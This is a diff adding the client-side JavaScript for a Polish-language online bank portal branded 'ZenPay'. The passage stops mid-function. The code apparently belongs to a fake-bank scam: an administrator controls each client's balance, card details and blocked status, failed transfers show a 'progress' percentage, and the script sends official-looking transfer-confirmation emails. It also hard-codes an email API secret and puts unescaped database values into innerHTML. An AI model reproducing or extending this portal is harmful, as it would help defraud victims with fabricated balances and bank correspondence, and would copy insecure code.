@@ -1,0 +1,2316 @@
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
+import { getDatabase, ref, get, onValue, update, push, set } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNlEk",
+  authDomain: "vantex-admin-2026.firebaseapp.com",
+  databaseURL: "https://vantex-admin-2026-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "vantex-admin-2026",
+  storageBucket: "vantex-admin-2026.firebasestorage.app",
+  messagingSenderId: "810884502320",
+  appId: "1:810884502320:web:b8ba7c2909ddf4ccf02ef5"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+await import("https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js").then(m=>m.signInAnonymously(m.getAuth(app)));
+
+let user = null;
+let currentHistory = [];
+let historyListener = null;
+let balanceListener = null;
+let statusListener = null;
+let sessionId = null;
+let refreshInProgress = false;
+let banqueRef = null;
+let bannerTimer = null;
+
+// ===== FIELD ERROR UTILITIES =====
+function showFieldError(fieldId, message) {
+  const errorEl = document.getElementById('error-' + fieldId);
+  const inputEl = document.getElementById(fieldId);
+  if (errorEl) {
+    errorEl.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#f97316;font-size:16px;flex-shrink:0;"></i><span>' + message + '</span>';
+    errorEl.classList.add('visible');
+  }
+  if (inputEl) {
+    inputEl.classList.add('input-error');
+    const wrapper = inputEl.closest('.input-wrapper');
+    if (wrapper) {
+      const parentGroup = wrapper.closest('.field-group, .verify-code-section');
+      if (parentGroup) parentGroup.classList.add('has-error');
+    }
+  }
+}
+
+function clearFieldError(fieldId) {
+  const errorEl = document.getElementById('error-' + fieldId);
+  const inputEl = document.getElementById(fieldId);
+  if (errorEl) {
+    errorEl.innerHTML = '';
+    errorEl.classList.remove('visible');
+  }
+  if (inputEl) {
+    inputEl.classList.remove('input-error');
+    const wrapper = inputEl.closest('.input-wrapper');
+    if (wrapper) {
+      const parentGroup = wrapper.closest('.field-group, .verify-code-section');
+      if (parentGroup) parentGroup.classList.remove('has-error');
+    }
+  }
+}
+
+function clearAllTransferErrors() {
+  ['a', 'b', 'c', 'd', 'e', 'f'].forEach(id => clearFieldError(id));
+}
+
+function validateTextField(fieldId, emptyMessage) {
+  const input = document.getElementById(fieldId);
+  if (!input) return true;
+  if (!input.value.trim()) {
+    showFieldError(fieldId, emptyMessage);
+    return false;
+  }
+  clearFieldError(fieldId);
+  return true;
+}
+
+function validateAmountField() {
+  const input = document.getElementById('a');
+  const continueBtn = document.getElementById('continueBtn');
+  if (!input) return false;
+
+  const raw = input.value;
+
+  // Champ vide
+  if (!raw || raw.trim() === '') {
+    showFieldError('a', 'Proszę wpisać kwotę przelewu.');
+    if (continueBtn) continueBtn.disabled = true;
+    return false;
+  }
+
+  // Contient des espaces
+  if (raw.includes(' ')) {
+    const cleaned = raw.replace(/\s/g, '');
+    const example = cleaned || 'np. 3000';
+    showFieldError('a', `Proszę usunąć spacje. Poprawny format: ${example}`);
+    if (continueBtn) continueBtn.disabled = true;
+    return false;
+  }
+
+  // Contient des caractères non numériques (virgule, point, lettres, etc.)
+  if (!/^\d+$/.test(raw)) {
+    const digitsOnly = raw.replace(/[^0-9]/g, '');
+    const hasComma = raw.includes(',');
+    const hasDot = raw.includes('.');
+    const hasDecimal = /[,\.]\d{2}$/.test(raw);
+
+    let message = 'Proszę wpisać kwotę wyłącznie cyframi.';
+    if (digitsOnly) {
+      message += ` Poprawny format: ${digitsOnly}.`;
+      if (hasDecimal) {
+        message += ' Usuń część dziesiętną (np. ,00).';
+      } else if (hasComma || hasDot) {
+        message += ' Usuń separator.';
+      }
+    } else {
+      message += ' Na przykład: 13000';
+    }
+    showFieldError('a', message);
+    if (continueBtn) continueBtn.disabled = true;
+    return false;
+  }
+
+  // Montant numérique valide — vérifier le solde
+  const amt = Number(raw);
+  if (user && amt > Number(user.montant)) {
+    showFieldError('a', `Kwota przekracza dostępne saldo (${fmt(user.montant)}).`);
+    if (continueBtn) continueBtn.disabled = true;
+    return false;
+  }
+
+  clearFieldError('a');
+  if (continueBtn) {
+    const allFilled = ['b','c','d','e','f'].every(id => {
+      const el = document.getElementById(id);
+      return el && el.value.trim() !== '';
+    });
+    continueBtn.disabled = !allFilled;
+  }
+  return true;
+}
+
+function validateAllTransferFields() {
+  let ok = true;
+  ok = validateAmountField() && ok;
+  ok = validateTextField('b', 'Proszę wpisać imię i nazwisko beneficjenta.') && ok;
+  ok = validateTextField('c', 'Proszę wpisać numer IBAN lub konta.') && ok;
+  ok = validateTextField('d', 'Proszę wpisać kod BIC/SWIFT.') && ok;
+  ok = validateTextField('e', 'Proszę wpisać nazwę banku.') && ok;
+  ok = validateTextField('f', 'Proszę wpisać powód przelewu.') && ok;
+  return ok;
+}
+
+function setupCodeValidation() {
+  const codeInput = document.getElementById('code');
+  if (!codeInput) return;
+
+  // Dès que l'utilisateur commence à taper, on efface le message d'erreur
+  codeInput.addEventListener('input', function() {
+    clearFieldError('code');
+  });
+}
+
+function initCodeField() {
+  const codeInput = document.getElementById('code');
+  if (codeInput) {
+    codeInput.value = '';
+    clearFieldError('code');
+    // Optionnel : focus automatique sur le champ
+    // codeInput.focus();
+  }
+}
+
+
+
+// ===== API D'ENVOI D'EMAILS =====
+const API_URL = 'https://getzenpay-email-api.onrender.com/api/send-welcome';
+const API_KEY = 'GETZENPAY_2026_SECRET';
+
+function generateRandomCode(length = 4) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let result = '';
+  for (let i = 0; i < length; i++) {
+    result += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return result;
+}
+
+const TIME_ZONE = 'Europe/Warsaw';
+
+function getPolandDateTime() {
+  const now = new Date();
+  const dateStr = now.toLocaleDateString('pl-PL', {
+    timeZone: TIME_ZONE,
+    day: '2-digit',
+    month: '2-digit',
+    year: 'numeric'
+  });
+  const timeStr = now.toLocaleTimeString('pl-PL', {
+    timeZone: TIME_ZONE,
+    hour: '2-digit',
+    minute: '2-digit'
+  });
+  return { dateStr, timeStr, timestamp: now.getTime(), now };
+}
+
+const sendMail = async ({ to, name, pct, success, montant, beneficiaire, compte, reference, isRefund = false }) => {
+  try {
+    const suffixe = generateRandomCode();
+    const { dateStr, timeStr } = getPolandDateTime();
+
+    let sujet;
+    if (isRefund) {
+      sujet = `${suffixe} ${name} - Twój przelew został anulowany`;
+    } else {
+      sujet = success ? `${suffixe} ${name} - Twój przelew został wysłany` : `${suffixe} ${name} - Twój przelew został odrzucony`;
+    }
+
+    let montantFormatted = montant || '0.00 zł';
+    let benef = beneficiaire || '---';
+    let compteAffiche = compte || '---';
+    const ref = reference || '---';
+    let statutLabel, statutColor, statutBg, headerColor, accentColor, messageText, iconChar;
+
+    if (isRefund) {
+      statutLabel = 'ANULOWANY';
+      statutColor = '#DC2626';
+      statutBg = '#FEF2F2';
+      headerColor = '#DC2626';
+      accentColor = '#DC2626';
+      messageText = 'Twój przelew został anulowany przez administratora ZenPay. Środki zostały zwrócone na Twoje konto bankowe.';
+      iconChar = '✕';
+      benef = 'ZenPay';
+      if (compteAffiche && compteAffiche.length > 9) {
+        compteAffiche = compteAffiche.substring(0, 9) + '*********';
+      } else {
+        compteAffiche = 'ZPY916398*********';
+      }
+    } else if (success) {
+      statutLabel = 'ZREALIZOWANY';
+      statutColor = '#059669';
+      statutBg = '#ECFDF5';
+      headerColor = '#0D9488';
+      accentColor = '#10B981';
+      messageText = 'Twoje zlecenie przelewu zostało pomyślnie zrealizowane. Środki zostaną przelane w ciągu 1 do 3 minut po ostatecznej weryfikacji.';
+      iconChar = '✓';
+    } else {
+      statutLabel = 'ODRZUCONY (' + (pct || 0) + '%)';
+      statutColor = '#B45309';
+      statutBg = '#FFFBEB';
+      headerColor = '#D97706';
+      accentColor = '#F59E0B';
+      messageText = 'Twoje zlecenie przelewu zostało odrzucone z powodu nieprawidłowych danych lub przekroczenia limitu. Sprawdź dane i spróbuj ponownie.';
+      iconChar = '!';
+    }
+
+    const footerTextPlain = 'W przypadku pytań lub wątpliwości skontaktuj się z nami: noreply@zenpaybj.xyz';
+
+    const htmlContent = `
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Potwierdzenie przelewu – ZenPay</title>
+</head>
+<body style="margin:0; padding:0; background:#f3f4f6; font-family:'Segoe UI',Arial,sans-serif; -webkit-font-smoothing:antialiased;">
+<table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f3f4f6; margin:0; padding:0;">
+  <tr>
+    <td align="center" style="padding:0; margin:0;">
+      <table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%; max-width:none; background:#ffffff; border-radius:0; overflow:hidden;">
+
+        <!-- HEADER -->
+        <tr>
+          <td style="background:linear-gradient(135deg, ${headerColor}, ${isRefund ? '#991B1B' : (success ? '#0F766E' : '#B45309')}); padding:28px 24px; text-align:center;">
+            <div style="font-size:36px; font-weight:900; color:#fff; letter-spacing:-0.5px;">ZenPay</div>
+            <div style="font-size:10px; color:rgba(255,255,255,0.75); margin-top:4px; text-transform:uppercase; letter-spacing:2px;">Bankowość internetowa</div>
+          </td>
+        </tr>
+
+        <!-- BADGE STATUT -->
+        <tr>
+          <td align="center" style="padding:28px 24px 8px;">
+            <div style="display:inline-block; background:${statutBg}; color:${statutColor}; border:1.5px solid ${statutColor}; border-radius:50px; padding:8px 24px; font-size:12px; font-weight:700; letter-spacing:1px; text-transform:uppercase;">
+              ${iconChar} ${statutLabel}
+            </div>
+          </td>
+        </tr>
+
+        <!-- MESSAGE -->
+        <tr>
+          <td style="padding:16px 24px 8px; text-align:left;">
+            <p style="margin:0; font-size:14px; color:#4b5563; line-height:1.5;">${messageText}</p>
+          </td>
+        </tr>
+
+        <!-- RÉCÉPISSE BANCAIRE -->
+        <tr>
+          <td style="padding:8px 24px 24px;">
+            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#fafbfc; border:1px solid #e5e7eb; border-radius:12px; overflow:hidden;">
+              <tr>
+                <td colspan="2" style="background:#f8fafc; padding:14px 20px; border-bottom:1px solid #e5e7eb;">
+                  <div style="font-size:10px; color:#9ca3af; text-transform:uppercase; letter-spacing:1.5px; font-weight:600;">Potwierdzenie przelewu</div>
+                  <div style="font-size:16px; font-weight:700; color:#1a1a2e; margin-top:2px;">#${ref}</div>
+                </td>
+              </tr>
+              <tr>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280; width:40%;">Data i godzina</td>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:13px; color:#1a1a2e; font-weight:600;">${dateStr} • ${timeStr}</td>
+              </tr>
+              <tr>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280;">Kwota</td>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:18px; color:${accentColor}; font-weight:800;">${montantFormatted}</td>
+              </tr>
+              <tr>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280;">${isRefund ? 'Nadawca' : 'Odbiorca'}</td>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:13px; color:#1a1a2e; font-weight:600;">${benef}</td>
+              </tr>
+              <tr>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280;">Konto (IBAN)</td>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:13px; color:#1a1a2e; font-weight:600; font-family:'Courier New',monospace; word-break:break-all;">${compteAffiche}</td>
+              </tr>
+              <tr>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6; font-size:11px; color:#6b7280;">Status</td>
+                <td style="padding:12px 20px; border-bottom:1px solid #f3f4f6;">
+                  <span style="display:inline-block; background:${statutBg}; color:${statutColor}; border-radius:20px; padding:4px 14px; font-size:12px; font-weight:700;">${statutLabel}</span>
+                </td>
+              </tr>
+              ${!success && !isRefund ? `<tr>
+                <td style="padding:12px 20px; font-size:11px; color:#6b7280;">Postęp</td>
+                <td style="padding:12px 20px; font-size:13px; color:#1a1a2e; font-weight:700;">${pct || 0}%</td>
+              </tr>` : ''}
+            </table>
+          </td>
+        </tr>
+
+        <!-- SÉCURITÉ -->
+        <tr>
+          <td style="padding:0 24px 24px;">
+            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f0fdf4; border:1px solid #bbf7d0; border-radius:10px;">
+              <tr>
+                <td style="padding:14px 18px;">
+                  <div style="font-size:12px; color:#15803d; font-weight:600; margin-bottom:4px;">🔒 Bezpieczeństwo transakcji</div>
+                  <div style="font-size:12px; color:#22c55e; line-height:1.5;">To potwierdzenie zostało wygenerowane automatycznie przez system ZenPay. Nie przekazuj tego e-maila osobom trzecim.</div>
+                </td>
+              </tr>
+            </table>
+          </td>
+        </tr>
+
+        <!-- FOOTER -->
+        <tr>
+          <td style="padding:20px 24px; border-top:1px solid #f3f4f6; text-align:center;">
+            <div style="font-size:11px; color:#9ca3af; line-height:1.6;">
+              ${footerTextPlain}<br>
+              <span style="font-size:11px; color:#d1d5db;">© 2026 ZenPay Finance. Wszelkie prawa zastrzeżone.</span>
+            </div>
+          </td>
+        </tr>
+
+      </table>
+    </td>
+  </tr>
+</table>
+</body>
+</html>`;
+
+    const textContent = `ZENPAY – POTWIERDZENIE PRZELEWU
+
+Status: ${statutLabel}
+${messageText}
+
+─────────────────────────────
+Numer rezerwacji: #${ref}
+Data: ${dateStr}
+Godzina: ${timeStr}
+Kwota: ${montantFormatted}
+${isRefund ? 'Nadawca' : 'Odbiorca'}: ${benef}
+Konto (IBAN): ${compteAffiche}
+${!success && !isRefund ? 'Postęp: ' + (pct || 0) + '%' : ''}
+─────────────────────────────
+
+${footerTextPlain}
+© 2026 ZenPay Finance.`;
+
+    const res = await fetch(API_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': API_KEY
+      },
+      body: JSON.stringify({
+        email: to,
+        prenom: name,
+        sujet: sujet,
+        html: htmlContent,
+        text: textContent
+      })
+    });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.error || 'Erreur inconnue');
+    return data;
+  } catch (error) {
+    console.error('Erreur envoi mail:', error);
+    throw error;
+  }
+};
+
+// ===== OVERLAY SPINNER =====
+const overlay = document.getElementById('loading-overlay');
+let loadingTimeout = null;
+
+function showLoading(message = 'Ładowanie...') {
+  if (loadingTimeout) {
+    clearTimeout(loadingTimeout);
+    loadingTimeout = null;
+  }
+  const textEl = overlay.querySelector('.spinner-text');
+  if (textEl) textEl.textContent = message;
+  overlay.setAttribute('aria-busy', 'true');
+  overlay.classList.add('active');
+}
+
+function hideLoading() {
+  overlay.removeAttribute('aria-busy');
+  overlay.classList.remove('active');
+  if (loadingTimeout) {
+    clearTimeout(loadingTimeout);
+    loadingTimeout = null;
+  }
+  loadingTimeout = setTimeout(() => {
+    const textEl = overlay.querySelector('.spinner-text');
+    if (textEl) textEl.textContent = 'Ładowanie...';
+  }, 500);
+}
+
+window.withSpinner = function(action, duration = 350) {
+  let start = Date.now();
+  showLoading('Ładowanie...');
+  let result;
+  try {
+    result = action();
+  } catch (e) {
+    console.error(e);
+    hideLoading();
+    toast('Wystąpił błąd podczas akcji');
+    return;
+  }
+  if (result && typeof result.then === 'function') {
+    result
+      .then(() => {
+        const elapsed = Date.now() - start;
+        const remaining = Math.max(0, duration - elapsed);
+        setTimeout(hideLoading, remaining);
+      })
+      .catch((err) => {
+        console.error(err);
+        toast('Wystąpił błąd podczas akcji');
+        hideLoading();
+      });
+  } else {
+    const elapsed = Date.now() - start;
+    const remaining = Math.max(0, duration - elapsed);
+    setTimeout(hideLoading, remaining);
+  }
+};
+
+// ===== THEMES =====
+const themes = {
+  teal: { p: '#0D9488', l: '#CCFBF1' },
+  purple: { p: '#6A0DAD', l: '#F3E8FF' },
+  blue: { p: '#2563EB', l: '#DBEAFE' },
+  yellow: { p: '#EAB308', l: '#FEF3C7' },
+  rose: { p: '#E83B7A', l: '#FCE4EC' },
+  orange: { p: '#F97316', l: '#FED7AA' },
+  green: { p: '#22C55E', l: '#DCFCE7' }
+};
+
+function adjustBrightness(hex, percent) {
+  const num = parseInt(hex.replace('#', ''), 16);
+  const r = Math.min(255, Math.max(0, (num >> 16) + percent));
+  const g = Math.min(255, Math.max(0, ((num >> 8) & 0x00FF) + percent));
+  const b = Math.min(255, Math.max(0, (num & 0x0000FF) + percent));
+  return `#${(r << 16 | g << 8 | b).toString(16).padStart(6, '0')}`;
+}
+
+function applyTheme(theme) {
+  const t = themes[theme] || themes.teal;
+  document.documentElement.style.setProperty('--p', t.p);
+  document.documentElement.style.setProperty('--p-light', t.l);
+  document.documentElement.style.setProperty('--p-gradient', `linear-gradient(135deg, ${t.p}, ${adjustBrightness(t.p, -10)})`);
+  document.documentElement.style.setProperty('--p-soft', `${t.p}14`);
+  localStorage.setItem('zenpay_theme', theme);
+}
+
+const urlParams = new URLSearchParams(window.location.search);
+const urlTheme = urlParams.get('theme');
+const savedTheme = (urlTheme && themes[urlTheme]) ? urlTheme : (localStorage.getItem('zenpay_theme') || 'teal');
+applyTheme(savedTheme);
+
+// ===== SYNCHRONISATION TEMPS RÉEL DEPUIS L'ADMIN =====
+const bannedScreen = document.getElementById('banned-screen');
+const blockedMsg = document.getElementById('blocked-msg');
+
+function showBanned() {
+  document.querySelectorAll('.screen').forEach(s => {
+    s.classList.remove('active');
+    s.style.display = 'none';
+  });
+  if (bannedScreen) bannedScreen.style.display = 'flex';
+  if (window.__clientIdFromUrl) {
+    localStorage.removeItem('zenpay_client_cache_' + window.__clientIdFromUrl);
+  }
+}
+
+function showLogin() {
+  if (bannedScreen) bannedScreen.style.display = 'none';
+}
+
+function hideBlockedMsg() {
+  if (blockedMsg) blockedMsg.style.display = 'none';
+}
+
+function showBlockedMsg() {
+  if (blockedMsg) blockedMsg.style.display = 'block';
+}
+
+function updateClientDisplay(data) {
+  if (!data) {
+    showBanned();
+    return;
+  }
+  const nameEl = document.getElementById('client-name');
+  if (nameEl && data.nom) {
+    nameEl.textContent = data.nom;
+    nameEl.style.display = 'block';
+  }
+  if (data.theme && themes[data.theme]) {
+    applyTheme(data.theme);
+    localStorage.setItem('zenpay_theme', data.theme);
+  }
+  if (window.__clientIdFromUrl) {
+    const cacheKey = 'zenpay_client_cache_' + window.__clientIdFromUrl;
+    localStorage.setItem(cacheKey, JSON.stringify({
+      nom: data.nom || '',
+      theme: data.theme || 'teal',
+      timestamp: Date.now()
+    }));
+  }
+  if (data.blocked) {
+    showLogin();
+    showBlockedMsg();
+    return;
+  }
+  showLogin();
+  hideBlockedMsg();
+}
+
+if (window.__clientIdFromUrl) {
+  onValue(ref(db, 'clients/' + window.__clientIdFromUrl), (snap) => {
+    const data = snap.val();
+    if (!data) {
+      localStorage.removeItem('zenpay_session');
+      localStorage.removeItem('zenpay_session_id');
+      localStorage.removeItem('zenpay_client_id');
+      showBanned();
+      return;
+    }
+    updateClientDisplay(data);
+    if (data.blocked) {
+      showBlockedMsg();
+      if (localStorage.getItem('zenpay_session')) {
+        localStorage.removeItem('zenpay_session');
+        localStorage.removeItem('zenpay_session_id');
+        localStorage.removeItem('zenpay_client_id');
+        if (user) {
+          user = null;
+          if (historyListener) historyListener();
+          if (balanceListener) balanceListener();
+          if (statusListener) statusListener();
+          if (banqueRef) banqueRef();
+          clearBannerTimer();
+        }
+        show('login');
+      }
+    } else {
+      hideBlockedMsg();
+    }
+  });
+
+  if (!localStorage.getItem('zenpay_session')) {
+    showLoading('Weryfikacja konta...');
+    get(ref(db, 'clients/' + window.__clientIdFromUrl)).then((snap) => {
+      const data = snap.val();
+      hideLoading();
+
+      if (!data) {
+        showBanned();
+        return;
+      }
+
+      updateClientDisplay(data);
+
+      if (data.blocked) {
+        showBlockedMsg();
+        show('login');
+      } else {
+        hideBlockedMsg();
+        show('login');
+      }
+
+      const newUrl = new URL(window.location.href);
+      newUrl.searchParams.set('nom', encodeURIComponent(data.nom || ''));
+      newUrl.searchParams.set('theme', encodeURIComponent(data.theme || 'teal'));
+      window.history.replaceState({}, '', newUrl.toString());
+
+    }).catch(() => {
+      hideLoading();
+      show('login');
+    });
+  }
+} else if (!localStorage.getItem('zenpay_session')) {
+  show('login');
+}
+
+// ===== FORMAT DE MONNAIE =====
+function normalizeDevise(dev) {
+  if (!dev) return 'PLN';
+  var d = String(dev).trim().toUpperCase();
+  if (d === 'ZŁ' || d === 'PLN') return 'PLN';
+  if (d === 'EUR' || d === '€') return 'EUR';
+  if (d === 'USD' || d === '$' || d === '$') return 'USD';
+  if (d === 'ILS' || d === '₪') return 'ILS';
+  return d;
+}
+
+function getDeviseSymbol(code) {
+  if (code === 'PLN') return 'zł';
+  if (code === 'EUR') return '€';
+  if (code === 'USD') return '$';
+  if (code === 'ILS') return '₪';
+  return code;
+}
+
+function getDeviseLabel(code) {
+  if (code === 'PLN') return 'PLN (zł)';
+  if (code === 'EUR') return 'EUR (€)';
+  if (code === 'USD') return 'USD ($)';
+  if (code === 'ILS') return 'ILS (₪)';
+  return code;
+}
+
+const fmt = (n) => {
+  const devCode = normalizeDevise((user && user.devise) ? user.devise : 'zł');
+  const sym = getDeviseSymbol(devCode);
+  const num = Number(n) || 0;
+  const parts = num.toFixed(2).split('.');
+  let intPart = parts[0];
+  const reversed = intPart.split('').reverse().join('');
+  const groups = reversed.match(/.{1,3}/g);
+  const spaced = groups.join(' ').split('').reverse().join('');
+  return spaced + ',' + parts[1] + ' ' + sym;
+};
+
+function adjustFontSize(element, baseSize, maxChars, minSize) {
+  if (!element) return;
+  requestAnimationFrame(() => {
+    const text = element.textContent || '';
+    const container = element.parentElement;
+    if (!container) return;
+    const containerWidth = container.clientWidth - 10;
+    const avgCharWidth = baseSize * 0.55;
+    const maxCharsLocal = maxChars || Math.floor(containerWidth / avgCharWidth);
+    let newSize = baseSize;
+    if (text.length > maxCharsLocal) {
+      newSize = Math.max(minSize || 10, baseSize * (maxCharsLocal / text.length));
+    }
+    element.style.fontSize = newSize + 'px';
+  });
+}
+
+function adjustGreetingFontSize() {
+  const greetSpan = document.querySelector('#greet span');
+  if (greetSpan) {
+    const container = document.getElementById('greet');
+    if (container) {
+      const containerWidth = container.clientWidth - 80;
+      const baseSize = 18;
+      const avgCharWidth = baseSize * 0.55;
+      const maxChars = Math.floor(containerWidth / avgCharWidth);
+      adjustFontSize(greetSpan, baseSize, maxChars, 12);
+    }
+  }
+}
+
+function adjustBalanceFontSize(element) {
+  if (!element) return;
+  const text = element.textContent || '';
+  const container = element.parentElement;
+  if (!container) return;
+  const containerWidth = container.clientWidth - 40;
+  const baseSize = 24;
+  const avgCharWidth = baseSize * 0.55;
+  const maxChars = Math.floor(containerWidth / avgCharWidth);
+  adjustFontSize(element, baseSize, maxChars, 10);
+}
+
+function adjustStatFontSize(element) {
+  if (!element) return;
+  const text = element.textContent || '';
+  const container = element.parentElement;
+  if (!container) return;
+  const containerWidth = container.clientWidth - 20;
+  const baseSize = 20;
+  const avgCharWidth = baseSize * 0.55;
+  const maxChars = Math.floor(containerWidth / avgCharWidth);
+  adjustFontSize(element, baseSize, maxChars, 11);
+}
+
+function adjustAllTexts() {
+  adjustGreetingFontSize();
+  const bal = document.getElementById('bal');
+  if (bal) adjustBalanceFontSize(bal);
+  document.querySelectorAll('.stat-value').forEach(el => adjustStatFontSize(el));
+}
+
+function updateBalanceDisplay(balanceElement, statElement, amount) {
+  const formatted = fmt(amount);
+  if (balanceElement) {
+    balanceElement.textContent = formatted;
+    adjustBalanceFontSize(balanceElement);
+  }
+  if (statElement) {
+    statElement.textContent = formatted;
+    adjustStatFontSize(statElement);
+  }
+  adjustAllTexts();
+}
+
+// ===== DONNÉES BANCAIRES =====
+function updateBankData(data) {
+  if (!data) return;
+  document.getElementById('ibanOwner').textContent = data.ibanOwner || 'KWIATKOWSKI PW';
+  document.getElementById('ibanNumber').textContent = data.iban || 'LT15 2339 1465 189X XXXX';
+  document.getElementById('ibanBic').textContent = data.ibanBic || 'TTQGLTIJCJK';
+  document.getElementById('ibanBank').textContent = data.ibanBank || 'ZenPay Finance';
+  const holder = data.carteHolder || 'JAN KOWALSKI';
+  const numRaw = data.carteNumero || '455655188867XXXX';
+  const num = numRaw.replace(/\s/g, '');
+  const exp = data.carteExpiry || '02/28';
+  const cvv = data.carteCvv || '556';
+  const detailNumEl = document.getElementById('cardDetailNumber');
+  const detailCvvEl = document.getElementById('cardDetailCvv');
+  detailNumEl.dataset.realNumber = num;
+  detailCvvEl.dataset.realCvv = cvv;
+  document.getElementById('cardHolderName').textContent = holder;
+  document.getElementById('cardDetailHolder').textContent = holder;
+  document.getElementById('cardExpiry').textContent = exp;
+  document.getElementById('cardDetailExpiry').textContent = exp;
+  document.getElementById('cardCvv').textContent = '***';
+  document.getElementById('cardDetailCvv').textContent = '***';
+  const p1 = num.substring(0,4), p2 = num.substring(4,8), p3 = num.substring(8,12);
+  document.getElementById('cardNumber').innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>XXXX</span>`;
+  detailNumEl.textContent = `${p1} ${p2} ${p3} XXXX`;
+}
+
+function setupBankListener(userId) {
+  if (banqueRef) banqueRef();
+  banqueRef = onValue(ref(db, 'clients/' + userId + '/banque'), (snapshot) => {
+    const data = snapshot.val();
+    updateBankData(data);
+  });
+}
+
+// ===== SESSIONS =====
+async function getPublicIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip || 'Inconnue';
+  } catch {
+    return 'Inconnue';
+  }
+}
+
+function getDeviceName() {
+  const ua = navigator.userAgent;
+  if (ua.includes('iPhone')) return 'iPhone';
+  if (ua.includes('Android')) return 'Android';
+  if (ua.includes('Windows')) return 'Windows PC';
+  if (ua.includes('Mac')) return 'Mac';
+  if (ua.includes('Linux')) return 'Linux';
+  return 'Appareil inconnu';
+}
+
+async function updateSession(connected = true) {
+  if (!user || !user._id) return;
+  const ip = await getPublicIP();
+  const device = getDeviceName();
+  const now = Date.now();
+
+  const storedSessionId = localStorage.getItem('zenpay_session_id');
+  if (storedSessionId) {
+    const sessionSnap = await get(ref(db, 'clients/' + user._id + '/sessions/' + storedSessionId));
+    if (sessionSnap.exists()) {
+      await update(ref(db, 'clients/' + user._id + '/sessions/' + storedSessionId), {
+        connected: connected,
+        lastActivity: now,
+        ip: ip,
+        device: device
+      });
+      sessionId = storedSessionId;
+      return;
+    }
+  }
+
+  const newSessionRef = push(ref(db, 'clients/' + user._id + '/sessions'));
+  const newSessionId = newSessionRef.key;
+  await set(newSessionRef, {
+    device: device,
+    ip: ip,
+    connected: connected,
+    lastActivity: now,
+    created: now
+  });
+  localStorage.setItem('zenpay_session_id', newSessionId);
+  sessionId = newSessionId;
+}
+
+async function refreshSession() {
+  if (user && user._id && sessionId) {
+    const ip = await getPublicIP();
+    await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), {
+      lastActivity: Date.now(),
+      ip: ip
+    });
+  }
+}
+
+// ===== HISTORIQUE =====
+function renderHistory(historyArray) {
+  const list = document.getElementById('history-list');
+  list.innerHTML = '';
+  let count = 0;
+  if (!historyArray || historyArray.length === 0) {
+    list.innerHTML =
+    `<div class="empty-history"><i class="fa-regular fa-receipt"></i> Brak transakcji</div>`;
+  } else {
+    const getTransactionTime = (item) => {
+      if (item.timestamp && typeof item.timestamp === 'number') {
+        return item.timestamp;
+      }
+      if (item.date && item.time) {
+        const parts = item.date.split('.');
+        if (parts.length === 3) {
+          const day = parseInt(parts[0], 10);
+          const month = parseInt(parts[1], 10) - 1;
+          const year = parseInt(parts[2], 10);
+          const timeParts = item.time.split(':');
+          const hours = parseInt(timeParts[0], 10);
+          const minutes = parseInt(timeParts[1], 10);
+          return new Date(year, month, day, hours, minutes).getTime();
+        }
+      }
+      return 0;
+    };
+
+    const sorted = [...historyArray].sort((a, b) => {
+      return getTransactionTime(b) - getTransactionTime(a);
+    });
+
+    count = sorted.length;
+    sorted.forEach(d => {
+      const card = document.createElement('div');
+      card.className = 'history-item';
+      card.setAttribute('data-id', d.id);
+      card.setAttribute('data-timestamp', d.timestamp);
+      const pos = d.amount >= 0;
+      const isRefund = pos && d.title === 'Zwrot';
+      let displayTitle = d.title;
+      let displaySubtitle = d.subtitle;
+      let iconClass = '';
+      let amountClass = '';
+      let iconHtml = '';
+
+      if (isRefund) {
+        displayTitle = 'Zwrot';
+        iconClass = 'refund';
+        amountClass = 'refund';
+        iconHtml = '<i class="fa-solid fa-rotate-left"></i>';
+      } else if (pos) {
+        iconClass = 'credit';
+        amountClass = 'credit';
+        iconHtml = '<i class="fa-solid fa-building-columns"></i>';
+      } else {
+        iconClass = 'debit';
+        amountClass = 'debit';
+        iconHtml = '<i class="fa-solid fa-user"></i>';
+      }
+
+      const subtitleHtml = displaySubtitle ? `<span class="sub">• ${displaySubtitle}</span>` : '';
+      card.innerHTML = `
+        <div class="history-left">
+          <div class="history-icon ${iconClass}">${iconHtml}</div>
+          <div class="history-info">
+            <div class="title">${displayTitle} ${subtitleHtml}</div>
+            <div class="meta">${d.date || ''} • ${d.time || ''}</div>
+          </div>
+        </div>
+        <div class="history-amount ${amountClass}">${pos ? '+ ' : '- '}${fmt(Math.abs(d.amount))}</div>
+      `;
+      card.onclick = () => showTxDetail(d);
+      list.appendChild(card);
+    });
+  }
+  document.getElementById('stat-tx').textContent = count;
